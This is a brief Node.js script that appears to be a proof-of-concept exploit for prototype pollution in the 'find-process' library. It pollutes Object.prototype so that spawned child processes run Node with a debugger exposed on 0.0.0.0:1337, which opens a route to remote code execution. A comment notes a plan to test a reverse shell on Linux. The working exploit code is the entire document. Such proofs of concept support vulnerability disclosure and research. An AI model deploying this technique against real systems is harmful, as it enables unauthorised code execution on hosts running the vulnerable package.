const find = require('find-process');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: Test a reverse shell on Linux

find('pid', 12345)
  .then(function (list) {
    console.log(list);
  }, function (err) {
    console.log(err.stack || err);
  })